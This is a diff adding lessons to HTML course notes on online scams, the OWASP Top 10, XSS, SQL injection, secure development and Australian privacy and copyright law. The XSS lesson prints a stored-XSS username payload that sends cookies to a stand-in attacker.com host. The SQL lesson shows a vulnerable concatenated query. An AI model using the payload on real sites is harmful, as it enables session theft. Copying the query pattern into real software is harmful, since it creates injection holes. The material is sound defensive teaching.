+            <p>Maintaining updated and secure systems across all devices is fundamental. Outdated software is a key target for cybercriminals, and anti-virus tools alone are insufficient without regular updates.</p>
+          </div>
+        </div>
+        <!-- END Prevention (Organisations) -->
+
+        <div class="topic-panel" data-topic="m2l3-individual">
+          <div class="note-card">
+            <span class="tag">Individuals</span>
+            <h3><span class="card-icon">◆</span>How to Spot Online Scams &amp; Stay Safe</h3>
+            <ul>
+              <li>1. <span class="key-term">Don't rush - think first.</span> Scammers want you to panic and click fast. Slow down and double-check before acting.</li>
+              <li>2. <span class="key-term">Check the facts.</span> Got a weird message from your bank or a streaming service? Don't click their links - look up the company yourself and go to their real website.</li>
+              <li>3. <span class="key-term">Don't trust the link.</span> Links can be faked to look real. Hover to see where they really lead, but it's safer to type the website in yourself.</li>
+              <li>4. <span class="key-term">A message from a friend isn't automatically safe.</span> Hackers often take over real accounts - if a message seems off, verify another way (text or call them).</li>
+              <li>5. <span class="key-term">Don't download random files.</span> Unless you know the person and were expecting a file, don't download anything.</li>
+              <li>6. <span class="key-term">Foreign offers = 100% fake.</span> Prize or inheritance emails from another country? Delete it.</li>
+              <li>7. <span class="key-term">Never share personal or financial info.</span> Real companies never ask for passwords or bank details through email.</li>
+              <li>8. <span class="key-term">Ignore random offers or requests for help.</span> If you didn't ask for help or don't know the group, it's likely fake - find a legitimate charity yourself if you want to donate.</li>
+            </ul>
+          </div>
+        </div>
+        <!-- END Prevention (Individuals) -->
+
+        <div class="topic-panel" data-topic="m2l3-proactive">
+          <div class="note-card">
+            <span class="tag">Proactive</span>
+            <h3><span class="card-icon">◆</span>Security Awareness Training</h3>
+            <p>About being ready before an attack happens - like learning how to recognise and dodge a trap. Teaches: spotting scams (phishing emails, fake phone calls); knowing the risks; staying safe online; reporting problems; and keeping training fresh with regular reminders.</p>
+            <p><em>Example: if someone sends a fake email pretending to be from your school asking for login credentials, training helps you spot that it's not right and avoid clicking.</em></p>
+          </div>
+          <div class="note-card">
+            <span class="tag">Reactive</span>
+            <h3><span class="card-icon">◆</span>Incident Response Training</h3>
+            <p>Kicks in after something goes wrong. Teaches people how to respond to a cyber attack or breach: noticing something's wrong; stopping the damage by shutting down the problem area; saving evidence; telling the right people (IT or cyber security staff); and fixing it up.</p>
+            <p><em>Example: if someone accidentally clicks a bad link and the network gets infected, this training helps staff act fast to contain it and fix the damage.</em></p>
+          </div>
+          <div class="note-card">
+            <h3>Key Differences</h3>
+            <div class="table-wrap">
+              <table class="data-table">
+                <tr><th>Security Awareness</th><th>Incident Response</th></tr>
+                <tr><td>Stops attacks before they happen</td><td>Reacts after an attack has started</td></tr>
+                <tr><td>Focuses on educating people to spot threats</td><td>Focuses on how to act when something goes wrong</td></tr>
+                <tr><td>Builds habits for safer behaviour</td><td>Builds skills for fast, smart reactions</td></tr>
+              </table>
+            </div>
+            <p>Think of it like a seatbelt <strong>and</strong> airbags - security awareness helps stop things before they go wrong, incident response helps minimise damage when they do. Together, they form a strong defence against cyber threats.</p>
+          </div>
+        </div>
+        <!-- END Proactive vs Reactive -->
+
+      </div>
+      <!-- END WEEK 2 / LESSON 3 -->
+
+      <!-- ════════════════════════════════
+           WEEK 2 / LESSON 4 — Software Security
+           ════════════════════════════════ -->
       <div class="lesson-group" data-module="2" data-lesson="4">
+
         <div class="lesson-header">
           <span class="lesson-eyebrow">Week 2 · Lesson 4</span>
           <h2>Software Security</h2>
-          <p class="lesson-description">Waiting on the next screenshot to fill this lesson in.</p>
+          <p class="lesson-description">Building security in from the start, and two of the most common web application vulnerabilities: XSS and SQL injection.</p>
         </div>
+
         <div class="topic-tabs">
-          <button class="topic-tab active" data-topic="m2l4-first">Overview</button>
+          <button class="topic-tab active" data-topic="m2l4-overview">Overview</button>
+          <button class="topic-tab" data-topic="m2l4-xss">Cross-Site Scripting (XSS)</button>
+          <button class="topic-tab" data-topic="m2l4-xss-prevent">Preventing XSS</button>
+          <button class="topic-tab" data-topic="m2l4-sqli">SQL Injection</button>
+          <button class="topic-tab" data-topic="m2l4-sqli-prevent">Preventing SQL Injection</button>
         </div>
-        <div class="topic-panel active" data-topic="m2l4-first">
+
+        <div class="topic-panel active" data-topic="m2l4-overview">
           <div class="note-card">
-            <span class="tag">Placeholder</span>
-            <h3><span class="card-icon">◆</span>Not Yet Added</h3>
-            <p>Send the screenshot for this lesson and it'll be structured the same way as Lesson 1.</p>
+            <span class="tag">Principle</span>
+            <h3><span class="card-icon">◆</span>Security by Design (SbD)</h3>
+            <p>When you're building software, security needs to be part of the plan from the very beginning, not something tacked on at the end - like building a house with locks already in place, rather than adding them after you move in. SbD means:</p>
+            <ul>
+              <li>Thinking about how to protect data before you even write your first line of code</li>
+              <li>Writing secure code that helps stop hackers and keeps users safe</li>
+            </ul>
+            <p>This approach helps prevent problems before they happen, rather than trying to fix them later.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag">OWASP</span>
+            <h3><span class="card-icon">◆</span>Top 10 Web Application Security Risks</h3>
+            <p>The OWASP Foundation is a trusted group that helps developers understand common threats to web applications. Their Top 10 most serious security risks every developer should know:</p>
+            <ul>
+              <li>1. <span class="key-term">Broken access control</span> - users can access things they're not supposed to</li>
+              <li>2. <span class="key-term">Cryptographic failures</span> - personal or financial information isn't stored or sent securely</li>
+              <li>3. <span class="key-term">Injection</span> - attackers trick software into running harmful code</li>
+              <li>4. <span class="key-term">Insecure design</span> - risks related to design flaws</li>
+              <li>5. <span class="key-term">Security misconfiguration</span> - settings are too open or badly set up</li>
+              <li>6. <span class="key-term">Vulnerable &amp; outdated components</span> - libraries or plugins with known security flaws</li>
+              <li>7. <span class="key-term">Identification &amp; authentication failures</span> - login systems don't protect accounts properly</li>
+              <li>8. <span class="key-term">Software &amp; data integrity failures</span> - assumptions about updates or critical data without verifying integrity</li>
+              <li>9. <span class="key-term">Security logging &amp; monitoring failures</span> - attacks happen but no one notices or logs what happened</li>
+              <li>10. <span class="key-term">Server-side request forgery</span> - data sent to your program can be tampered with</li>
+            </ul>
+            <p>Resources: Secure Coding - Best Practices Handbook; Australian Government ISM - Guidelines for Software Development (ACSC); OWASP Top Ten.</p>
           </div>
         </div>
-      </div>
+        <!-- END Overview -->
 
+        <div class="topic-panel" data-topic="m2l4-xss">
+          <div class="note-card">
+            <span class="tag">Software Risk</span>
+            <h3><span class="card-icon">◆</span>What is XSS?</h3>
+            <p>Cross-site scripting (XSS) is a security problem found in websites. It lets hackers add their own code - usually JavaScript - to a web page that other people will see. Someone could <span class="key-term">inject</span> dangerous code into a website, and when other users visit, their browsers run the attacker's code without knowing it.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag">Impact</span>
+            <h3><span class="card-icon">◆</span>Why XSS is a Big Deal</h3>
+            <p>If a website has an XSS flaw, an attacker can:</p>
+            <ul>
+              <li>Change how the website looks or behaves</li>
+              <li>Steal private information like cookies</li>
+              <li>Pretend to be the user and take actions on their behalf</li>
+              <li>Spread the attack to other users like a virus</li>
+            </ul>
+            <p>XSS usually happens when a website takes user input (names, messages, comments) and shows it on a page without checking or cleaning it up first.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag">Example</span>
+            <h3><span class="card-icon">⌁</span>Stored XSS</h3>
+            <p>Say there's a message board where people can register with a username. If the site doesn't clean up what people type, a hacker could register with a name containing a script that sends the user's cookies to the hacker's website.</p>
+            <div class="terminal-box">
+              <div class="terminal-bar"><span></span><span></span><span></span><em>example username</em></div>
+              <div class="terminal-body">user123&lt;script&gt;document.location='https://attacker.com/?cookie='+encodeURIComponent(document.cookie)&lt;/script&gt;</div>
+            </div>
+            <p>When someone visits the board and sees this username, their browser runs the code and silently sends their cookies to the hacker, who can then hijack the user's login. This is called <span class="key-term">stored XSS</span> because the harmful code is saved in the website's database and shown to users again and again.</p>
+            <p>Stored XSS can act like a worm - it spreads itself. Imagine a social media profile with injected code: everyone who visits gets infected too, and those infected profiles might spread it further until the whole site is under attack.</p>
+          </div>
+        </div>
+        <!-- END XSS -->
+
+        <div class="topic-panel" data-topic="m2l4-xss-prevent">
+          <div class="note-card">
+            <span class="tag">Mitigation</span>
+            <h3><span class="card-icon">◆</span>Preventing XSS Attacks</h3>
+            <p>A zero-trust approach is the best prevention against XSS attacks:</p>
+            <ul>
+              <li>Sanitise all user input by escaping special characters</li>
+              <li>Validate all user input for type, length, range and format using server-side validation</li>
+              <li>Encode special characters in all output to the browser</li>
+              <li>Users should have the option to disable client-side scripts</li>
+            </ul>
+            <p>Client-side validation can also help reduce invalid or unacceptable inputs, but should never be relied on by itself.</p>
+          </div>
+        </div>
+        <!-- END Preventing XSS -->
+
+        <div class="topic-panel" data-topic="m2l4-sqli">
+          <div class="note-card">
+            <span class="tag">Software Risk</span>
+            <h3><span class="card-icon">◆</span>SQL Injection</h3>
+            <p>A code insertion technique used to attack data-driven applications, in which malicious code is inserted into a normal SQL statement to dump contents from a database. Malformed SQL queries are produced through <span class="key-term">unsanitised user input</span>. Though easily preventable by validating input, this is often not done, letting attackers embed malicious code in a hard-coded SQL statement.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag">Form</span>
+            <h3><span class="card-icon">⌁</span>Incorrectly Filtered Escape Characters</h3>
+            <p>Occurs if user input is passed to an SQL statement without filtering escape characters:</p>
+            <div class="terminal-box">
+              <div class="terminal-bar"><span></span><span></span><span></span><em>vulnerable query</em></div>
+              <div class="terminal-body">"SELECT * FROM users WHERE username= '"+username+"'"</div>
+            </div>
+            <p>The <code>username</code> variable can be crafted by attackers, either by inputting an always-true clause or by commenting out the rest of the query. By inserting a semicolon, attackers can execute a separate SQL statement.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag">Form</span>
+            <h3><span class="card-icon">◆</span>Incorrect Type Handling</h3>
+            <p>Takes place when no appropriate type checking is performed. The implementation can be the same as above - the injection works by prematurely terminating a text string and appending a new command. There are many other forms of injection beyond these two.</p>
+          </div>
+        </div>
+        <!-- END SQL Injection -->
+
+        <div class="topic-panel" data-topic="m2l4-sqli-prevent">
+          <div class="note-card">
+            <span class="tag">Mitigation</span>
+            <h3><span class="card-icon">◆</span>Validating User Input</h3>
+            <p>Assume all user-submitted data is unsafe. Validate all input using functions such as MySQL's <code>mysql_real_escape_string()</code> to ensure dangerous characters (like <code>'</code>) aren't passed to a query. All user data should be sanitised and filtered using type, range and format checks.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag">Mitigation</span>
+            <h3><span class="card-icon">◆</span>Parameterised Statements</h3>
+            <p>Instead of embedding user input into a query string, use placeholders to receive parameters. This also solves the type-handling problem, since a placeholder can only receive a value of the correct type.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag">Mitigation</span>
+            <h3><span class="card-icon">◆</span>Prepared Statements &amp; Stored Procedures</h3>
+            <p>With prepared statements, instead of directly assembling and executing your query string, you store a prepared statement, feed it the data, and it assembles and sanitises it for you on execution.</p>
+            <p>Stored procedures group one or more SQL statements into a logical unit; subsequent executions can be automatically parameterised. They prevent some types of SQL injection but not all, so don't rely on them exclusively.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag">Mitigation</span>
+            <h3><span class="card-icon">◆</span>Database Permissions &amp; Firewalls</h3>
+            <p>Applying least-privilege database permissions helps reduce vulnerabilities. Web application firewalls (WAF) and database firewalls help protect against SQL exploits by identifying and blocking unauthorised database transactions - but can't be relied on as the only line of defence, and may only slow attacks rather than preventing them.</p>
+          </div>
+        </div>
+        <!-- END Preventing SQL Injection -->
+
+      </div>
+      <!-- END WEEK 2 / LESSON 4 -->
+
+      <!-- ════════════════════════════════
+           WEEK 2 / LESSON 5 — Key Legislation
+           ════════════════════════════════ -->
       <div class="lesson-group" data-module="2" data-lesson="5">
+
         <div class="lesson-header">
           <span class="lesson-eyebrow">Week 2 · Lesson 5</span>
           <h2>Key Legislation</h2>
-          <p class="lesson-description">Waiting on the next screenshot to fill this lesson in.</p>
+          <p class="lesson-description">Three pieces of Australian legislation affecting how organisations control the collection, storage and communication of data. Reviewed here after first appearing in Unit 3, Week 16.</p>
         </div>
+
         <div class="topic-tabs">
-          <button class="topic-tab active" data-topic="m2l5-first">Overview</button>
+          <button class="topic-tab active" data-topic="m2l5-overview">Overview</button>
+          <button class="topic-tab" data-topic="m2l5-privacy-act">Privacy Act 1988</button>
+          <button class="topic-tab" data-topic="m2l5-apps">Australian Privacy Principles</button>
+          <button class="topic-tab" data-topic="m2l5-pdpa">Privacy &amp; Data Protection Act 2014</button>
+          <button class="topic-tab" data-topic="m2l5-ipps">Information Privacy Principles</button>
+          <button class="topic-tab" data-topic="m2l5-copyright">Copyright Act 1968</button>
         </div>
-        <div class="topic-panel active" data-topic="m2l5-first">
+
+        <div class="topic-panel active" data-topic="m2l5-overview">
           <div class="note-card">
-            <span class="tag">Placeholder</span>
-            <h3><span class="card-icon">◆</span>Not Yet Added</h3>
-            <p>Send the screenshot for this lesson and it'll be structured the same way as Lesson 1.</p>
+            <span class="tag">Overview</span>
+            <h3><span class="card-icon">◆</span>Three Key Pieces of Legislation</h3>
+            <p>There are three pieces of legislation to be familiar with that affect how organisations control the <span class="key-term">collection, storage (including cloud storage) and communication</span> of data. They also make mention of data disposal, discussed separately.</p>
+            <ul>
+              <li>1. Copyright Act 1968</li>
+              <li>2. Privacy Act 1988</li>
+              <li>3. Privacy and Data Protection Act 2014</li>
+            </ul>
           </div>
         </div>
-      </div>
+        <!-- END Overview -->
 
+        <div class="topic-panel" data-topic="m2l5-privacy-act">
+          <div class="note-card">
+            <span class="tag">Federal Law</span>
+            <h3><span class="card-icon">◆</span>Privacy Act 1988</h3>
+            <p>A federal law covering <span class="key-term">all states and territories in Australia</span>.</p>
+            <p><strong>Organisations covered:</strong></p>
+            <ul>
+              <li>Commonwealth government departments</li>
+              <li>ACT government agencies</li>
+              <li>Private organisations with: turnover of at least $3 million/year, OR that hold health information, OR buy/sell personal information for profit, OR are contracted to provide a service to the Commonwealth</li>
+            </ul>
+            <p><strong>Main points:</strong></p>
+            <ul>
+              <li>Only collect information that is necessary</li>
+              <li>Only use information for the purpose it was intended</li>
+              <li>Do not disclose information to a third party for any other purpose</li>
+              <li>Individuals may access and correct information held about them</li>
+              <li>The organisation must have a publicly available privacy policy</li>
+              <li>The organisation must take steps to ensure the quality and security of information</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="topic-panel" data-topic="m2l5-apps">
+          <div class="note-card">
+            <span class="tag">Guidelines</span>
+            <h3><span class="card-icon">◆</span>Australian Privacy Principles (APPs)</h3>
+            <p>Guidelines under the Privacy Act 1988 that govern the collection, use and disclosure of personal information in Australia - promoting transparency, data quality, security, individual access and complaint resolution.</p>
+          </div>
+          <div class="card-grid">
+            <div class="note-card">
+              <span class="tag">APP 1</span>
+              <h3>Open &amp; Transparent Management</h3>
+              <p>Organisations must be clear about how they handle personal information - e.g. privacy statements and easy-to-understand data policies.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">APP 3</span>
+              <h3>Collection of Solicited Information</h3>
+              <p>Limits collection to what's reasonably necessary, collected lawfully and fairly - e.g. minimising data fields, clear consent mechanisms.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">APP 6</span>
+              <h3>Use or Disclosure</h3>
+              <p>Personal information collected for a specific purpose must only be used or disclosed for that purpose unless the individual consents.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">APP 8</span>
+              <h3>Cross-Border Disclosure</h3>
+              <p>Personal information transferred overseas must remain protected in line with APPs - e.g. safeguards for cloud storage/processing.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">APP 9</span>
+              <h3>Government-Related Identifiers</h3>
+              <p>Restricts using government identifiers (e.g. tax file numbers) for identification in private-sector databases.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">APP 11</span>
+              <h3>Security of Personal Information</h3>
+              <p>Requires safeguarding personal information against misuse, loss or unauthorised access - robust encryption, access controls, regular testing.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="topic-panel" data-topic="m2l5-pdpa">
+          <div class="note-card">
+            <span class="tag">State Law (Vic)</span>
+            <h3><span class="card-icon">◆</span>Privacy and Data Protection Act 2014</h3>
+            <p>Governs the handling of personal information by Victorian public sector organisations, protecting privacy through principles for data collection, use and disclosure, and ensuring data security. This is a state law covering <span class="key-term">only Victoria</span>.</p>
+            <p><strong>Organisations covered:</strong></p>
+            <ul>
+              <li>Victorian government departments and public sector agencies</li>
+              <li>Victoria Police</li>
+              <li>State government schools</li>
+              <li>Public Victorian universities</li>
+              <li>Public hospitals and health services (non-medical information only - medical info is covered by the Health Records Act 2001)</li>
+              <li>Organisations providing government-funded services</li>
+            </ul>
+            <p>Agencies must safeguard data with security assessments and encryption. While not mandatory, entities are encouraged to notify affected individuals after a significant breach. The <span class="key-term">Victorian Information Commissioner</span> oversees compliance; penalties for breaches may include legal action or administrative orders.</p>
+          </div>
+        </div>
+
+        <div class="topic-panel" data-topic="m2l5-ipps">
+          <div class="note-card">
+            <span class="tag">Guidelines</span>
+            <h3><span class="card-icon">◆</span>Information Privacy Principles (IPPs)</h3>
+            <p>Outlined under the Privacy and Data Protection Act 2014, applicable to Victorian public sector agencies. These align with the APPs but are tailored to state-specific data protection.</p>
+          </div>
+          <div class="card-grid">
+            <div class="note-card">
+              <span class="tag">IPP 1</span>
+              <h3>Collection</h3>
+              <p>Information must be collected fairly, lawfully and not intrusively - ask only for necessary info, inform users of the purpose.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">IPP 2</span>
+              <h3>Use &amp; Disclosure</h3>
+              <p>Restricts how information can be used or disclosed (aligns with APP 6) - shared only per policy and user consent.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">IPP 4</span>
+              <h3>Data Security</h3>
+              <p>Data must be protected from misuse, loss, unauthorised access and modification - encryption, secure authentication, regular updates.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">IPP 5</span>
+              <h3>Openness</h3>
+              <p>Agencies must be open about how information is managed - privacy policy links and clear documentation.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">IPP 7</span>
+              <h3>Unique Identifiers</h3>
+              <p>Restricts adopting identifiers assigned by other organisations unless necessary, consented to, or via a contracted provider.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">IPP 9</span>
+              <h3>Transborder Data Flows</h3>
+              <p>Personal information must not leave Victoria unless the recipient jurisdiction has equivalent privacy protections.</p>
+            </div>
+            <div class="note-card">
+              <span class="tag">IPP 10</span>
+              <h3>Sensitive Information</h3>
+              <p>Requires stricter handling of sensitive information (e.g. health or ethnic background data) - high security, limited access.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="topic-panel" data-topic="m2l5-copyright">
+          <div class="note-card">
+            <span class="tag">Federal Law</span>
+            <h3><span class="card-icon">◆</span>Copyright Act 1968</h3>
+            <p>A federal law applying across all states and territories, establishing the legal framework for copyright protection. Updated in 2000 by the Copyright Amendment (Digital Agenda) Bill 2000 to address digital technology and online content distribution.</p>
+            <p>Protects <span class="key-term">intellectual property (IP)</span> - original creations of the mind including written text, videos, software and artistic works - granting creators exclusive control over the use of their work. Infringement can lead to civil penalties (court-ordered cessation, financial damages) or, in severe cases, criminal charges and imprisonment.</p>
+            <p><strong>Main points:</strong></p>
+            <ul>
+              <li><span class="key-term">Ownership</span> - IP belongs to the creator unless assigned otherwise (e.g. to an employer)</li>
+              <li><span class="key-term">Automatic protection</span> - copyright is automatic and free once work is in a tangible form</li>
+              <li><span class="key-term">Types protected</span> - literary, dramatic, musical and artistic works, films, sound recordings, broadcasts</li>
+              <li><span class="key-term">Exclusions</span> - ideas, concepts, names, slogans or images of people are not covered</li>
+              <li><span class="key-term">Control of usage</span> - owners control how and when material is used and shared</li>
+              <li><span class="key-term">Employer rights</span> - employers hold copyright over works employees produce as part of their job</li>
+              <li><span class="key-term">Personal use exception</span> - copying music you legally own (e.g. CD to device) for personal use only</li>
+            </ul>
+          </div>
+        </div>
+
+      </div>
+      <!-- END WEEK 2 / LESSON 5 -->
+
+      <!-- ════════════════════════════════
+           WEEK 2 / LESSON 6 — Improving Development Security Practices
+           ════════════════════════════════ -->
       <div class="lesson-group" data-module="2" data-lesson="6">
+
         <div class="lesson-header">
           <span class="lesson-eyebrow">Week 2 · Lesson 6</span>
-          <h2>Improving Development Security Practices</h2>
-          <p class="lesson-description">Waiting on the next screenshot to fill this lesson in.</p>
+          <h2>Strategies for Improving Development Security</h2>
+          <p class="lesson-description">Building security in from day one - onboarding, ongoing training, and risk management planning.</p>
         </div>
+
         <div class="topic-tabs">
-          <button class="topic-tab active" data-topic="m2l6-first">Overview</button>
+          <button class="topic-tab active" data-topic="m2l6-overview">Overview</button>
+          <button class="topic-tab" data-topic="m2l6-onboarding">Onboarding &amp; Induction</button>
+          <button class="topic-tab" data-topic="m2l6-training">Developer Training</button>
+          <button class="topic-tab" data-topic="m2l6-risk">Risk Management Plans</button>
+          <button class="topic-tab" data-topic="m2l6-risk-tables">Risk Register Example</button>
         </div>
-        <div class="topic-panel active" data-topic="m2l6-first">
+
+        <div class="topic-panel active" data-topic="m2l6-overview">
           <div class="note-card">
-            <span class="tag">Placeholder</span>
-            <h3><span class="card-icon">◆</span>Not Yet Added</h3>
-            <p>Send the screenshot for this lesson and it'll be structured the same way as Lesson 1.</p>
+            <span class="tag">Definition</span>
+            <h3><span class="card-icon">◆</span>What is Secure Development?</h3>
+            <p>The process of creating software designed to be safe from the start. Instead of waiting until something goes wrong, secure development means thinking about security at every stage - from planning and coding to testing and deployment. It's about writing code that:</p>
+            <ul>
+              <li>Protects against hackers and malicious attacks</li>
+              <li>Keeps user data safe</li>
+              <li>Prevents bugs that could be exploited</li>
+              <li>Follows best practices and legal standards</li>
+            </ul>
+            <p>Think of it like building a house with strong locks, alarms and fire exits already in place - not adding them after someone breaks in.</p>
+          </div>
+          <div class="note-card">
+            <span class="tag">Why It Matters</span>
+            <h3><span class="card-icon">◆</span>Why Secure Development is Important</h3>
+            <ul>
+              <li><span class="key-term">Protects user data</span> - passwords, credit card numbers, personal information</li>
+              <li><span class="key-term">Prevents costly problems</span> - fixing a breach after release can be expensive and damaging</li>
+              <li><span class="key-term">Builds trust</span> - users and clients are more likely to use software they know is safe</li>
+              <li><span class="key-term">Meets legal and industry standards</span> - many industries require secure coding practices by law</li>
+            </ul>
+            <p>Each strategy below helps make software more secure - used together, they create a strong defence against threats.</p>
           </div>
         </div>
+        <!-- END Overview -->
+
+        <div class="topic-panel" data-topic="m2l6-onboarding">
+          <div class="note-card">
+            <span class="tag">Practice</span>
+            <h3><span class="card-icon">◆</span>Onboarding &amp; Induction for Developers</h3>
+            <p>Onboarding is the process of welcoming new developers to a project or team - setting them up for success, especially when it comes to writing secure code. When security is part of the team culture from day one, developers are more likely to follow good habits and avoid risky mistakes.</p>
+            <p><strong>Secure onboarding practices:</strong></p>
+            <ul>
+              <li><span class="key-term">Security briefings</span> - a short session on security during first-day orientation</li>
+              <li><span class="key-term">Access control</span> - only give new developers the permissions they need, not full access "just in case"</li>
+              <li><span class="key-term">Codebase walkthroughs</span> - show how security is handled in the code (encryption, authentication, error handling)</li>
+              <li><span class="key-term">Team introductions</span> - make sure new developers know who to talk to about security questions</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="topic-panel" data-topic="m2l6-training">
+          <div class="note-card">
+            <span class="tag">Practice</span>
+            <h3><span class="card-icon">◆</span>Developer Training for Secure Development</h3>
+            <p>Even experienced developers can make mistakes. Ongoing training keeps security top of mind and helps everyone stay up to date with the latest threats and best practices.</p>
+            <p><strong>Training focus areas:</strong></p>
+            <ul>
+              <li><span class="key-term">Common vulnerabilities</span> - e.g. XSS, SQL injection, broken authentication</li>
+              <li><span class="key-term">Safe coding standards</span> - validating user input and encoding output to prevent attacks</li>
+              <li><span class="key-term">Security tools</span> - tools that scan code for weaknesses</li>
+              <li><span class="key-term">OWASP Top 10</span> - the most critical web app security risks, updated regularly</li>
+            </ul>
+            <p><strong>Ways to train developers:</strong></p>
+            <ul>
+              <li>Online courses - self-paced learning (e.g. Codecademy)</li>
+              <li>Workshops and hackathons - hands-on practice solving security problems</li>
+              <li>Refresher sessions - short, regular meetings to review key topics</li>
+              <li>Code reviews - encourage peer reviews with a focus on spotting security issues</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="topic-panel" data-topic="m2l6-risk">
+          <div class="note-card">
+            <span class="tag">Practice</span>
+            <h3><span class="card-icon">◆</span>Developing Risk Management Plans</h3>
+            <p>A risk management plan helps teams think ahead - a document outlining what could go wrong in a project, how likely it is, and what to do about it. Instead of waiting for problems to happen, risk management is about being proactive, spotting issues early and reducing their impact.</p>
+            <p><strong>Steps in risk management:</strong></p>
+            <ul>
+              <li>1. <span class="key-term">Identify risks</span> - what could go wrong? (e.g. using outdated libraries)</li>
+              <li>2. <span class="key-term">Assess risks</span> - how likely is it? How serious would it be?</li>
+              <li>3. <span class="key-term">Plan responses</span> - what actions will you take if the risk becomes real?</li>
+              <li>4. <span class="key-term">Monitor</span> - keep an eye on risks throughout the project and update the plan as needed</li>
+            </ul>
+            <p><strong>Examples of software risks:</strong></p>
+            <ul>
+              <li>Insecure third-party libraries - external code might have hidden vulnerabilities</li>
+              <li>Lack of input validation - not checking user input can lead to attacks</li>
+              <li>Poor user authentication - weak login systems can be easily bypassed</li>
+              <li>Delayed patching - not fixing known issues quickly can leave software exposed</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="topic-panel" data-topic="m2l6-risk-tables">
+          <div class="note-card">
+            <span class="tag">Sample Plan</span>
+            <h3><span class="card-icon">▤</span>Risk Identification</h3>
+            <p>Project: School Attendance App (example)</p>
+            <div class="table-wrap">
+              <table class="data-table">
+                <tr><th>ID</th><th>Risk Description</th><th>Category</th><th>Potential Cause</th></tr>
+                <tr><td>R1</td><td>Use of outdated third-party libraries</td><td>Technical</td><td>Lack of regular updates</td></tr>
+                <tr><td>R2</td><td>Weak user authentication</td><td>Security</td><td>Poor password policies</td></tr>
+                <tr><td>R3</td><td>Data loss during deployment</td><td>Operational</td><td>No backup strategy</td></tr>
+                <tr><td>R4</td><td>Incomplete input validation</td><td>Security</td><td>Developer oversight</td></tr>
+              </table>
+            </div>
+          </div>
+
+          <div class="note-card">
+            <h3><span class="card-icon">▤</span>Risk Assessment</h3>
+            <div class="table-wrap">
+              <table class="data-table">
+                <tr><th>ID</th><th>Likelihood</th><th>Impact</th><th>Risk Level</th></tr>
+                <tr><td>R1</td><td>Medium</td><td>High</td><td>High</td></tr>
+                <tr><td>R2</td><td>High</td><td>High</td><td>Critical</td></tr>
+                <tr><td>R3</td><td>Low</td><td>Medium</td><td>Medium</td></tr>
+                <tr><td>R4</td><td>Medium</td><td>High</td><td>High</td></tr>
+              </table>
+            </div>
+          </div>
+
+          <div class="note-card">
+            <h3><span class="card-icon">▤</span>Risk Response Plan</h3>
+            <div class="table-wrap">
+              <table class="data-table">
+                <tr><th>ID</th><th>Strategy</th><th>Action Plan</th><th>Responsible</th></tr>
+                <tr><td>R1</td><td>Mitigate</td><td>Schedule regular library updates</td><td>Alex (DevOps)</td></tr>
+                <tr><td>R2</td><td>Avoid</td><td>Implement multi-factor authentication</td><td>Jamie (Backend Dev)</td></tr>
+                <tr><td>R3</td><td>Mitigate</td><td>Set up automated backups before deployment</td><td>Taylor (SysAdmin)</td></tr>
+                <tr><td>R4</td><td>Mitigate</td><td>Add input validation checks and peer reviews</td><td>Morgan (Frontend Dev)</td></tr>
+              </table>
+            </div>
+          </div>
+
+          <div class="note-card">
+            <h3><span class="card-icon">▤</span>Risk Monitoring</h3>
+            <div class="table-wrap">
+              <table class="data-table">
+                <tr><th>ID</th><th>Monitoring Method</th><th>Frequency</th><th>Status</th></tr>
+                <tr><td>R1</td><td>Dependency scanner reports</td><td>Weekly</td><td>Open</td></tr>
+                <tr><td>R2</td><td>Security audit logs</td><td>Bi-weekly</td><td>In progress</td></tr>
+                <tr><td>R3</td><td>Backup test logs</td><td>Monthly</td><td>Closed</td></tr>
+                <tr><td>R4</td><td>Code review checklist</td><td>Per sprint</td><td>Open</td></tr>
+              </table>
+            </div>
+          </div>
+        </div>
+
       </div>
+      <!-- END WEEK 2 / LESSON 6 -->
 
     </div>
     <!-- END WEEK 2 PANEL -->
 
   </main>
-
 
   <script>
 
